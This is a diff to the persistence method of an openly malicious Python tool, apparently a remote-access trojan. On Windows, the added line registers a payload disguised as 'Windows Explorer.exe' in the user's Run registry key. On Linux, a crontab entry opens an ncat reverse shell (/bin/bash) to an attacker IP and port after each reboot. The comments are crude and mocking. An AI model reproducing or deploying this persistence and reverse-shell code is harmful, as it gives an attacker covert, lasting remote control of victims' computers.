@@ -23,9 +23,10 @@ class MotherFucker():
     def persistence(self):
         #Windows bullshit  adds it self to registery and starts fucking arount
         if sys.platform == "win32" or sys.platform == "win64":
-             location = os.environ["appdata"] + "\\Windows Explorer.exe"
+            location = os.environ["appdata"] + "\\Windows Explorer.exe"
+            subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d ''' + location + '"', shell=True)
         elif sys.platform == 'linux':
-             subprocess.call(f'(crontab -l ; echo "@reboot sleep 200 && ncat {IP} {PORT} -e /bin/bash")|crontab 2> /dev/null ', shell=True)
+            subprocess.call(f'(crontab -l ; echo "@reboot sleep 200 && ncat {IP} {PORT} -e /bin/bash")|crontab 2> /dev/null ', shell=True)
         elif sys.platform == "darwin":
             #TODO: mak for OS X cause why not ....
             pass
